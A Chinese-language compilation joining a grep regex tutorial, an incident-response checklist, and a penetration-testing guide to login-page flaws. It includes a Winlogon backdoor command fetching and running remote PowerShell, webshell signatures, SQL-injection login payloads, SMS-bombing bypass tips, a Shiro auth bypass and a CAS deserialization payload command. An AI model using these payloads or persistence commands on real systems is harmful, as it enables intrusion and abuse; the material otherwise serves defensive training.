 **连续的字符范围**

**[a-z] : a到z的所有小写字母**

**[A-Z]  ： A到Z所有的大写字母**

**[a-zA-Z] ：包含所有的大小写字母** 

**[0-9] ：0到9的所有数字**

**[a-zA-Z0-9 ] ：包含所有大小字母和数字**

### 为了方便后面的练习，在此建立个临时文件，写入字符，当做练习的文件

```
vim 1.txt
rot
rAt
rBt
r1t
root
rVCt
r4t
grep "r[a-z]t" 1.txtgrep "r[A-Z]t" 1.txt
```

![img](https://img-blog.csdnimg.cn/20190123210234548.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlaWFuXzk5,size_16,color_FFFFFF,t_70)

**^ 取反**

**[^a-z]**

```
grep "r[^0-9]t" 1.txt
```

![img](https://img-blog.csdnimg.cn/20190123210505532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlaWFuXzk5,size_16,color_FFFFFF,t_70)

### (2)匹配字符出现的位置

**^string 以string开头**

```
 grep "^root" /etc/passwd
```

![img](https://img-blog.csdnimg.cn/2019012321070646.png)

**对首行[rbh]开头**

```
grep "^[rbh]" /etc/passwd
```

![img](https://img-blog.csdnimg.cn/20190123210831400.png)

**不是【rbh】开头**

```
grep "^[^rbh]" /etc/passwd
```

![img](https://img-blog.csdnimg.cn/20190123210928496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlaWFuXzk5,size_16,color_FFFFFF,t_70)

**string$ 以string$结尾**

**以bash结尾的**

```
 grep "bash$" /etc/passwd
```

![img](https://img-blog.csdnimg.cn/20190123211047362.png)

**查看nologin的行数**

```
grep "nologin$" /etc/passwd | wc -l
```

![img](https://img-blog.csdnimg.cn/20190123211230787.png)

**^$ ： 代表 空行**

**查看目录名称（此处是指目录文件）**

```
ls -l /etc/ | grep "^d"
```

![img](https://img-blog.csdnimg.cn/20190123211622848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlaWFuXzk5,size_16,color_FFFFFF,t_70)

### 为了方便后面的练习，在此建立个临时文件，写入字符，当做练习的文件

```
vim 2.txt
a
ab
abb
abbbb
abbbbb
abbbbbbb
```

### *** 匹配其前一个字符出现任意次**

###  **.\*任意字符**

```
 grep "ab*" 3.txt
```

![img](https://img-blog.csdnimg.cn/20190123211950512.png)

### \?  0次或者1次  可有可无

```
grep "ab\?" 2.txt
```

![img](https://img-blog.csdnimg.cn/20190123212046669.png)

### \+ 1次或者多次  最少1次

```
grep "ab\+" 2.txt
```

### ![img](https://img-blog.csdnimg.cn/20190123212225265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlaWFuXzk5,size_16,color_FFFFFF,t_70)

### \{2\}  出现两次

```
grep "ab\{2\}" 2.txt
```

### ![img](https://img-blog.csdnimg.cn/20190123212324847.png)

### \{2，5\}  最少2次，最多5次

```
grep "ab\{2,5\}" 2.txt
```

![img](https://img-blog.csdnimg.cn/20190123212425325.png)

# option选项

## 1）-i 忽略大小写

```
[root@zhang ~]# grep -i "^r" 1.txt
```

## 2）-o 仅显示符合正则表达式的内容，不显示整行

```
[root@zhang ~]# grep -o  "r..t" /etc/passwdroot
```

## 3）-v 反向过滤

```
[root@zhang ~]# grep -v "^#" /etc/fstab/dev/mapper/centos-root /                       xfs     defaults        0 0UUID=20b4a09c-ba00-41d4-a6d5-7dc24bc0a057 /boot                   xfs     defaults        0 0/dev/mapper/centos-swap swap                    swap    defaults        0 0
```

## 4）-e 根据多条件过滤文件

```
[root@zhang ~]# grep -e "^$" -e "^#" /etc/fstab## /etc/fstab# Created by anaconda on Mon Jan  7 01:19:06 2019
```

## 4）-E 支持扩展正则表达式

```
grep -E "vmx|svm" /proc/cpuinfo
```

## 5）-A n 显示符合条件的后2行

```
[root@zhang ~]# ifconfig |grep -A 2 "netmask"        inet 192.168.196.131  netmask 255.255.255.0  broadcast 192.168.196.255        inet6 fe80::20c:29ff:fe8e:e21b  prefixlen 64  scopeid 0x20<link>        ether 00:0c:29:8e:e2:1b  txqueuelen 1000  (Ethernet)--        inet 127.0.0.1  netmask 255.0.0.0        inet6 ::1  prefixlen 128  scopeid 0x10<host>        loop  txqueuelen 1000  (Local Loopback)
```

## 6）-B n 显示符合条件的前2行

```
[root@zhang ~]# ifconfig |grep -B 2 "netmask"ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500        inet 192.168.196.131  netmask 255.255.255.0  broadcast 192.168.196.255--lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536        inet 127.0.0.1  netmask 255.0.0.0
```































# 应急响应

## **引子：**

 最近做了一些应急响应，在响应的时候也翻查了不少资料，发现大部分都是按照攻击来分类进行响应工作；寻摸着能不能有个一条龙的线路去进行应急响应(毕竟新手，倍感压力)，

于是粗略的整理了下；期间翻看了很多文章，把我认为可能用到的东西引导到了总结之中，所以本文仅为总结，非全部原创，难免谬误之处，请大家斧正，求大佬们手口留情 (首发猎户攻防实验室)

![1657874900_62d129d4563156affee5c.png!small?1657874900918](https://image.3001.net/images/20220715/1657874900_62d129d4563156affee5c.png!small?1657874900918)

## 目录

1、事件发现
2、资产信息情况掌握
3、备份保护
4、阻断隔离
5、事件研判
6、恶意文件等处理
7、研判结果
8、处置建议
9、附录：常用工具、反制、规范指南等

## 一、事件发现

关于事件的发现，通常来源于：

### 1.安全设备

扫描IP 、威胁阻断、 日志审计、 病毒木马、 入侵事件、 异常流量、 暴力破解等

### 2.内/外部通报

如CNNVD/各SRC/HW裁判组等通报信息

### 3.蜜罐捕获

攻击行为、 攻击者画像

### 4.钓鱼监控

- 恶意样本
- 恶意URL
- 恶意邮件

（ 针对恶意邮件，可查看邮件原文，查看发件人的IP地址； X-Originating-IP即为发件人ip地址。）

### 5.其他渠道消息来源

如QQ/微信群或其他如暗网信息等



## 二、了解涉事资产部署情况

### 1.部署时间

了解资产部署时间，可在后期推断日志信息，给予有利帮助

### 2.挂载应用

- 应用架构
- 服务、功能（上传功能？SQL语句维护功能？）
- 是否存在第三接口
- 是否存在第三方平台



### 3.端口、服务

开放的访问端口，部署的哪些服务

### 4.业务内容

业务内容是否敏感，核心业务还是边缘业务，业务使用对象是内部还是外部，是否涉及敏感数据等

### 5.是否开放公网访问

仅内网访问还是对外开放，确认应急范围

### 6.是否存在通用密码、弱口令

### 7.是否有维护厂商

### 8.是否纳入安全防护辖区

### 9.历史漏洞情况

通过历史漏洞情况掌握系统可靠性，并确认漏洞是否修复

### 10.是否有定期进行安全扫描

### 11.是否近期有日常维护、安全维护

### 12.是否安装防护软件，软件是否升级

### 13.是否针对热门漏洞升级补丁或修复

## 涉事资产所属部门

确认资产归属部门，方便情况了解及沟通

## 三、备份保护

### 1.系统镜像/快照

是否虚机或云机，可先镜像或快照备份，保留涉事资产镜像

### 2.应用程序备份

对应用程序整体备份，避免涉事环境破坏

### 3.数据库备份

对数据库整体备份，避免涉事环境破坏

### 4.后期排查中发现的可疑文件备份

备份可疑文件可为溯源等行为做信息支撑

## 四、阻断隔离处理

### 业务下线

有下线条件的及时进行业务下线，及时止损；

### 网络隔离阻断

及时对业务资产进行网络阻断隔离；

### 进程阻断

对发现的恶意进程等及时阻断

## 五、事件研判

### 5.1 Linux篇

为避免遗漏，通过以下几个方面进行研判：

### 5.1.1 history

通过执行

> history

或

> cat /root/.bash_history

命令，获取历史操作记录，检查是否有执行可疑命令

### 5.1.2 网络连接（端口）

通过命令查看网络连接及端口连接：

> netstat -anltp

### 5.1.3进程

常用命令：

> ps -ef
>
> ps -aux

查看进程对应pid：

> pgrep -l httpd

查看pid对应进程：

> ls -ll /proc/{PID}

或

> file /proc/{PID}/exe

进程分析：

> lsof -p {PID}

查看进程启动时间：

> ps -p 7224 -o lstart

查看有没有可疑进程

> ps -aef | grep inetd (注：inetd 程序是一个Linux守护进程)

检测隐藏进程：

> ps -ef | awk '{print}' | sort -n |uniq >1

参考：http://cn-sec.com/archives/974710.html

### 5.1.4 文件：

\1. 查看文件时注意查看隐藏文件，如“..”开头的文件夹

> ls -lat

2.查看24小时内修改的文件

> find ./ -mtime 0 -name "*.jsp"

\3. 查看24小时内创建的文件

> find ./ -ctime 0 -name "*.jsp"

\4. 查看文件详情：

stat命令

> stat

确认系统文件是否被替换，如find、wget等 查看文件信息

\5. 遇到无法查看的文件

> lsattr 文件名/文件夹



> chattr -i

\6. webshell文件查找

（1）webshell特征

> Darkblade：goaction=login
>
> JspSpy：o=login
>
> PhpSpy：action=phpinfo
>
> Regeorg：cmd=connect
>
> Other：cmd=

（2）恶意函数特征

> PHP：eval(、system(、assert(
>
> JSP：getRunTime(、 FileOutputStream(
>
> ASP：eval(、execute(、 ExecuteGlobal（

\7. 后门文件

（1）webshell

（2）应用程序

如python打包文件：

> python3 pyinstxtractor.py *.exe

### 5.1.5 日志文件

\1. 应用系统日志

（1）中间件日志

> tomcat
>
> nginx
>
> apache
>
> 其他……

（2）应用系统日志

\2. 安全设备日志

\3. 操作系统日志

主要目录/var/log/：

/var/log/cron  计划任务

/var/log/maillog  邮箱

/var/log/message  系统重要日志

/var/log/btmp  错误登录日志  命令：lastb

/var/log/wtmp  登录、注销等日志  命令：last

/var/log/utmp  当前已登录用户日志  命令： who、 w、  users

/var/log/lastlog  所有用户最后一次登录时间  命令：lastlog

### 5.1.6 内存

主要内存马等，检测：

> sc javax.servlet.Servlet

### 5.1.7 应用部署情况相关


\1. 框架结构

\2. 网络访问控制（策略）

\3. 通信交互（第三方通信等）

### 5.1.8 历史漏洞

\1. 历史渗透报告

\2. 漏扫结果

\3. 是否通用程序存在CVE

### 5.1.9 关联资产

确认当前资产所关联的其他资产信息，包括：

\1. web前端

\2. web后台

\3. 负载

\4. 中间件

\5. 数据库

\6. 其他

### 5.1.10 恶意IP

\1. IP归属

\2. 开放端口，对应服务 （反向渗透溯源）

\3. 在线态势感知结果

\4. 恶意域名解析情况：域名、注册邮箱、注册电话等

### 5.1.11 其他项

**1 . 帐号：**

（1）异常账户

（2）特权账号

UID为0 ：

> awk -F: '$3==0{print $1}' /etc/passwd

（3）可远程登录的账号

> awk '/$1|$6/{print $1}' /etc/shadow

（4）其他sudo权限的账号

> more /etc/sudoers | grep -v "^#|^$" | grep "ALL=(ALL)"

（5）查看登陆多久、多少用户，负载

uptime

**2.计划任务**

查看定时任务

> crontab -l

关注目录:

> /var/spool/cron/* 
> /etc/crontab
> /etc/cron.d/*
> /etc/cron.daily/* 
> /etc/cron.hourly/* 
> /etc/cron.monthly/*
> /etc/cron.weekly/
> /etc/anacrontab
> /var/spool/anacron/*

检查系统各个用户下是否存在计划任务

> cat /etc/passwd | cut -f 1 -d : |xargs -I {} crontab -l -u {}

**3. 登录日志**

\1. 登录成功的IP

> grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more

2.爆破用户名字典

> grep "Failed password" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print "$1n";}'|uniq -c|sort -nr

登录成功的日期、用户名、IP

> grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'

\4. **启动项**

目录/etc/profile.d/下的shell脚本

> ls -alt /etc/profile.d/*.sh

启动脚本的链接文件

(根据链接文件的名字来判断启动状态K开头表示不启动服务，S打头表示启动服务)

> ls -alt /etc/rc.d/rc{*}.d

服务的启动脚本

> ls -alt  /etc/init.d/*

启动项目检查

> chkconfig --list

**5. 服务**

**6.环境变量**

> env

### 5.2 Windows篇

### 5.2.1 账号

查看当前登录账户

> query user

注销用户id

> logoff {ID}

查看用户

> net user

查看用户登录情况

> net user username

检查Guest账号是否被启动

打开本地用户组

> lusrmgr.msc

注册表查看账户，确认系统是否存在隐藏账户

> HKEY_LOCAL_MACHINESAMSAMDomainsUsers\ regedit

检查影子账号，如：

> admin$

### 5.2.2 日志

windows 日志分析：

参考：http://cn-sec.com/archives/1012483.html

### 5.2.3 进程

msinfo32命令

> msinfo32

获取进程md5

> get-process | where path -ne $null | %{Get-FileHash $_.path -Algorithm md5}

查看进程详情

> wmic process get CreationDate,name,processid,commandline,ExecutablePath /value

pid进程对应服务

> tasklist  /FI “pid eq {pid}” /svc

其他：Process Explorer

### 5.2.4 网络连接

查看：

> netstat  -ano

已经成功建立的连接

> netstat -ano | findstr "ESTABLISHED"

### 5.2.5 启动项

> msconfig



> wmic startup



注册表中启动项:

> HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRun



> HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunonce



注册表镜像劫持

> HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsNTCurrentVersionImage File Execution Options

参考： http://cn-sec.com/archives/1000962.html

### 5.2.6 定时任务

at命令

> at

schtasks命令

> schtasks | more



> schtasks /query /fo LIST



> schtasks /query /v /tn "\Microsoft\windows\Bluetooths" /fo list



计划任务清单：

> C:\Windows\System32\Tasks

### 5.2.7 服务

命令：

> services.msc

恶意服务检测

> Get-WmiObject win32_service |?{ $_.name -eq 'svchost.exe' -and $_.PathName -notlike  '*C:\WINDOWS\System32\svchost.exe*' -and $_.PathName -notlike '*c:\Windows\SysWOW64\svchost.exe*'} | select Name, DisplayName, State, PathName



> Get-WmiObject win32_service | ?{$_.PathName -like '*svchost.exe*'} | select Name, DisplayName, @{Name="Path"; Expression={$_.PathName.split('
> ')[0]}} | Format-List

查看服务详情

> wmic service get name,pathname,processid,startname,status,state /value

### 5.2.8 文件

最近打开的文件

> %UserProfile%Recent

通过hash操作文件：

（1）获取文件MD5的hash

> certutil -hashfile c:\windows\system32\cmd.exe MD5 |findstr /r "^[a-fA-F0-9]*$"

（2）查找相同hash值文件

> [array]$md5=Get-FileHash .\*.exe -Algorithm md5
> $md5 | Where -Property Hash -in -Value "59B18D6146A2AA066F661599C496090D","6FF97A7DABF09EBB07C157F286DC81AD"

（3）删除相同hash值文件

> [array]$md5=Get-FileHash .\*.exe -Algorithm md5
> $md5 | Where -Property Hash -in -Value "59B18D6146A2AA066F661599C496090D","6FF97A7DABF09EBB07C157F286DC81AD"
> | Remove-Item

查找某一日期创建的文件

> forfiles /m *.exe /d +2019/2/12 /s /p c:\  /c "cmd /c echo @path @fdate @ftime" 2>nul

查看粘滞键exe ： sethc.exe文件的创建、修改时间是否正常

查看隐藏文件

> attrib -s -a -h -r {文件名}

查看放大镜exe ： Magnify.exe文件的创建、修改时间是否正常

### 5.2.9 其他

wmi无文件后门检测

> Get-WmiObject -Namespace root\default -list | Where-Object {$_.name -Match "^[a-z]"}
> Get-WmiObject -Namespace root\subscription -class commandlineeventconsumer
> Get-WmiObject -Namespace root\subscription -class __eventfilter
> Get-WmiObject -Namespace root\subscription -class __FilterToConsumerBinding



无文件后门实现

> 1、Set-ItemProperty  "HKLM:SOFTWAREMicrosoftWINDOWS NTCurrentVersionWinlogon" -name  Userinit -value "C:Windowssystem32userinit.exe,***************"
> 2、Set-ItemProperty  "HKLM:SOFTWAREMicrosoftWINDOWS NTCurrentVersionWinlogon" -name  Userinit -value "C:Windowssystem32userinit.exe, powershell.exe -nop  -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.131/a'))""

SDDL隐藏维持

参考：http://cn-sec.com/archives/1000962.html

补丁查看：

> wmic qfe get hotfixid

安装软件列表

> wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_Product get name /FORMAT:table

快捷方式列表

> wmic PATH Win32_ShortcutFile get name

DNS缓存记录

> ipconfig /displaydns



## 六、涉及恶意文件等清理

参考查找出的恶意文件进行清理，同时记得进行备份，以备查

## 七、研判结果

### 7.1 **攻击者画像**

> IP
>
> 域名
>
> shell密码/命名
>
> 昵称ID
>
> 手机号
>
> 邮箱
>
> QQ
>
> 微信
>
> 其他……



### 7.2 **总结攻击事件**

总结攻击事件链、路径、工具、IP、攻击手法(钓鱼、社工、web渗透、水坑、鱼叉)

### 7.3 **总结存在漏洞的链路**

如何利用多个漏洞进行攻击渗透等

### 7.4 **总结攻击面**

（1）是否横向移动

（2）影响资产数量

（3）影响数据范围（是否有数据丢失）

## 八、处置建议

### 8.1 **已执行操作**

日志备份

恶意文件备份

恶意文件清理

非法进程终止

非法连接断开

非法IP阻断（安全设备监控）

非法创建的账号清理

禁用或删除多余及可疑的账号

其他……

### 8.2 **后续建议**

（1）针对性建议

针对攻击链路存在的风险进行处理建议

（2）通用建议

程序、插件、模版等版本升级、补丁修复

实时监控、加强监测

参看历史漏洞报告，及时修复安全风险

服务器及应用程序权限最小化管理

上线下删除测试账号

远程连接3389/22执行IP白名单

 加强口令管理

 细分口令安全、弱口令修复

（3）钓鱼邮件防范措施：

  对公司来说：

  1)组织员工进行钓鱼邮件防范培训,提高全员网络空间安全防范意识;

  2)在公司内部不定期进行钓鱼邮件安全测试，及时发现问题并采取补救措施;

  3)使用高安全性邮件系统，并及时配置安全过滤机制;

  4)敦促员工安装杀毒软件,并及时更新病毒库.

  对个人来说：

  1)认真学习CNCERT发布的《钓鱼邮件攻击防范指南》，做到“五要”“五不要”，增强安全防范意识;

  2)不要轻信发件人地址显示的“显示名”,遇到索要敏感信息的邮件需要及时通过电话核实;

  3)切忌轻易打开邮件中文中的短链接,谨防上当受骗,造成财物损失;

  4)安装杀毒软件,邮件附件运行前先进行病毒查杀.

## 九、附录

### 9.1 常用在线工具

威胁信息管理平台 (Beta)：https://ti.watcherlab.com/#/search

勒索病毒引擎

  深信服 https://edr.sangfor.com.cn/#/information/ransom_search

  360 https://lesuobingdu.360.cn/

  奇安信 https://lesuobingdu.qianxin.com/

  腾讯 https://guanjia.qq.com/pr/ls/

  VenusEye https://lesuo.venuseye.com.cn/

反勒索病毒工具

  腾讯 https://habo.qq.com/tool/index

  金山毒霸 https://www.duba.net/dbt/wannacry.html

  瑞星 http://it.rising.com.cn/fanglesuo/index.html

  Avast https://www.avast.com/zh-cn/ransomware-decryption-tools

  Github tools https://github.com/jiansiting/Decryption-Tools

https://www.virustotal.com

https://app.any.run/

https://x.threatbook.cn/

https://ti.qianxin.com/

https://www.reg007.com/

https://www.venuseye.com.cn/

https://community.riskiq.com/

### 9.2 常用本地检测工具

### 9.2.1 Linux

   linux基线检查脚本

GScan

https://github.com/grayddq/GScan

Linux病毒扫描工具-ClamAV

http://www.clamav.net/download.html

security_check(linux)

https://github.com/ppabc/security_check

linux-2

https://github.com/T0xst/linux

### 9.2.2 Windows

windows下msinfo32.exe

360星图WEB日志分析工具

取证工具

共享访问监控https://www.nirsoft.net/utils/networkopenedfiles-x64.zip

wifi使用记录https://www.nirsoft.net/utils/wifihistoryview.zip

usb使用记录https://www.nirsoft.net/utils/usblogview.zip

内存取证DumpIt

moonsols http://www.moonsols.com/

Volatility

 https://www.volatilityfoundation.org/releases-vol3

  https://www.volatilityfoundation.org/releases

Ghost 镜像浏览https://www.symantec.com/connect/blogs/ghost-explorer

windows 日志分析工具LogParser

下载:https://www.microsoft.com/en-us/download/confirmation.aspx?id=24659

使用：查询用户登录情况

> LogParser.exe -i:EVT "SELECT TimeGenerated,EXTRACT_TOKEN(Strings,5,'|') AS USERNAME,EXTRACT_TOKEN(Strings,5,'|') AS SERVICE_NAME,EXTRACT_TOKEN(Strings,5,'|') AS Client_IP FROM 'C:Userswp_bj_windowsDesktop安全.evtx' WHERE EventID=4624"



查询登录成功的事件

> LogParser.exe -i:EVT –o:DATAGRID "SELECT * FROM 'C:Userswp_bj_windowsDesktop安全.evtx' where EventID=4624"

pchunter、火绒剑、auturuns 、Process Explorer、promon、D盾

Windows全日志提取工具FullEventLogView：http://www.nirsoft.net/utils/fulleventlogview-x64.zip

### 9.4 反制

mysql ： 获取微信id、浏览器的sqlite文件

伪装v#p%n文件，放置网站进行下载

jsonp





在日常渗透测试或者hw中，遇到最多的页面可能就是登录页面了。

在我刚入职时 最让我头疼的就是这种情况，在经历了这大半年的工作和学习下，我把我对于这种情况的思路和方法分享一下：

![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhmIOticw72F3JEibiaqWstN2Op8MCvTHSQ8gsd8aFmIREH8OfmpKbZn7SA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

##  

## 关于登录框出现的漏洞

------

###  

### **1. 明文传输/不安全的加密算法/用户名可枚举/爆破弱口令/验证码绕过**

这几个就放一起了，总结起来就俩字`爆破`

- 明文传输/不安全的加密算法：看似人畜无害的漏洞却给暴力破解带来了可能性
- 用户名枚举：又给爆破增加了成功率 这里要注意的一点是 有的站点的回显只有一点点不同 比如：(用户名或密码错误--用户名/密码错误) (都2077年了,不会还有站老老实实告诉你用户名不存在吧😂)
- 验证码绕过：验证码不刷新 (这种就是纯摆设验证码)；万能验证码 (如8888，0000一般为开发者为了测试方便设置的)；验证码回显 (有的网站验证码会回显到前端，只需要抓包即可获得验证码)；验证码识别(实在是绕不过去还有这最后一个方法 这里附上我常用的bp验证码识别插件 https://github.com/smxiazi/NEW_xp_CAPTCHA
- 社工字典: 推荐一个小工具,可以根据收集到的信息生成针对性较强的密码

- 

```
https://github.com/jx4321/genpass
```

### 

### ** **

------

###  

### **2. SQL注入**



直接在登录框存在sql注入的站越来越少了，不过还是要测一测的 会有惊喜发生的呦

- 万能密码: 这无疑是最简单也是最好用的sql注入,若存在此漏洞可直接绕过登录访问系统内部资源(随着对安全这种情况越来越少,入职来只遇到过一次)  常见万能密码如下:



```
or 1=1--  
'or 1=1--  
a'or' 1=1--  
"or 1=1--
......   (可直接放到枚举用户名的字典里顺便一起跑了)
```



- 登录框sql注入：这种应该比万能密码更少见，但是理论上也存在（比如开发时只对万能密码进行了过滤,过滤不全）可以通过加特定字符来测试是否存在 如 `'` `"` `#`

------

### ** **

### **3. 逻辑漏洞**



测试登陆页面是否存在逻辑漏洞 如：任意密码重置，任意账号注册，短信（邮件）轰炸等。

- 任意密码重置：一般存在与先验证身份，下一步，重置密码(修改密码)的系统，或验证码与手机号不绑定的系统。


![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhs1aqofzbibPwPSDzL0QwjUd2soRcFHl5DJJCpMz7LIoYia3Wo1BWD8Zw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)   ![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhVtBG3WBrlOo1kyg8GXicicFCvL9XGfn2oiaJibyTia9QJVQzxr7ayHyI1TA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)    ![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhVtBG3WBrlOo1kyg8GXicicFCvL9XGfn2oiaJibyTia9QJVQzxr7ayHyI1TA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)



- 任意账户注册：漏洞原理基本与任意密码重置相同,验证码未与手机号绑定或验证码可爆破
- 短信(邮箱)轰炸：未对发送间隔，一段时间内发送最大数量做服务端验证，抓包后不断重返即可，若做了一定防护可添加 `空格` `+86` 等进行绕过。
  下图以邮箱轰炸为例：


![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhNX45jocMGvPpLG3HFNxfjTibXKX9eJu26dyWFos3qicWKlSLw8PxfXug/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhCU96U2saaF1z11InLiar9iaseZL9CZFyRpUUq1RWRX7earxibGDLvElbw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

- 修改Respos返回信息：Response状态值，就是在服务器发送某个密码重置的凭据之后，出现特定的响应值,对Response状态值修改后，如果存在校验不严(存在逻辑漏洞)，并且回显值得校验是在客户端进行，就能使相关操作成功被执行。
  查看返回包结构：


![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhgp0dibAtL94J7mFiarOOictmibuDv1xy1ib3NFcVvheTSTCrX2F8qxL3o9g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
修改状态值：
![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhvuHpptejjmXSHhAAUDNibFShCTg3YutLy47pP9CLBb26hibSAUcaUobQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
成功进入系统：
![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhwRIRKSMVibI4OtfEpLBywPW8U0jsk6tz1U3JovU8FlRTUjXqFWicGp7A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

###  

------

###  

### **4. 框架漏洞**



- shiro/log4j/fastjson 反序列化: 这三个反序列化漏洞影响实在是太广了,前两年hw特别常见,这里就推荐几个bp的扫描插件吧(几乎不用手动测 全靠插件)

- 
- 

```
https://github.com/EASY233/BpScan(可被动扫描log4j,fastjson反序列化漏洞)https://github.com/pmiaowu/BurpShiroPassiveScan(用来扫描shiro反序列化)
```



下图为fastjson反序列化漏洞：
![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhBIhTDRqaOkqicWBHRrraJbXRgdGaxlwga8IG2ETiap9BFCrhYxHU4zMg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhtWxfeniatnOohJwptuJo0xcIicic5Dove2M1xOicJvXeyYVTL4LnuB5nUQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

- apereo-cas反序列化：pereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞
  随便输入账号密码抓包


![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhyZjicfEB4iaiaN8yjypgfvUOorWtQwxDPjZQAnPnDyaP904BN5pcADEpg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
使用：

https://github.com/vulhub/Apereo-CAS-Attack/releases/download/v1.0.0/apereo-cas-attack-1.0-SNAPSHOT-all.jar 此工具生成payload 命令如下

- 

```
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "curl aaa.dw7b1h.dnslog.cn"
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhtX5CzDViahKDsAkuXBg7oNQbaIVhZsoy7PycvPGEr2icbR4WicemA26AA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
将生成的payload替换请求包中的execution参数发送即可
![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhLRicvs4AibdppRyxcwd9LcPtE13YIEjh8bAwia2C5farW5a2Zic206jmxw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhs7wicAiaF9rz1IVRyOyicyD6rGFpiaBXts8jb1xYm2ILnDeFzL2gOq9chQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

- shiro权限绕过: 在路由中拼接`/;`,
  复现靶场  https://github.com/l3yx/springboot-shiro
  如果直接访问 /test/admin/page ，会返回302跳转要求登录


![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhO8zPiceK5pOiarXm6iabaGEsnwHmyQqsicSD1wNbd1Eib0iaN82kb6je18QA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
但是访问/;/test/admin/page , 就能直接绕过 Shiro 权限验证，访问到 /admin 路由中的信息
![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhTAI373HrYxNSmc7OHwGfyKjF7X8K6UTiapfh0Umv3aV1ZdokPQYh5pw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

- cms漏洞: 可借助指纹识别系统判断站点是否为cms搭建,如果是可借助漏洞库查询历史公开漏洞进行测试 下面推荐几个常用的地址

- 
- 
- 

```
http://finger.tidesec.net/(潮汐在线指纹识别)http://wiki.peiqi.tech/(peiqi文库(漏洞库),先查这个复现过程非常详细)https://avd.aliyun.com/(阿里云漏洞库,peiqi文库查不到再差这个)
```



------

###  

### **5. js相关**



- 禁用js：部分站点会先跳转到类似`/admin/index.html`的页面，然后检测到未登录会再跳转到`/login.html` 对于这种我们可以禁用 javascript 测试，会有意想不到的发生
- 查看js代码：js代码中经常会泄露有趣的东西，这里再推荐一下 FindSomething这个插件可以快速地发现js中重要信息
  下图为js泄露了用户名密码：

![图片](https://mmbiz.qpic.cn/mmbiz_png/ictCTpibjm037aqx3O0ObxweZmicBn1ndbhljmp0a0iagPFmgshG1u3liaue1mml6TbSd4jLnf98WVjZpdxWAIR82jg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

------

### ** **

### **6. 未授权** 



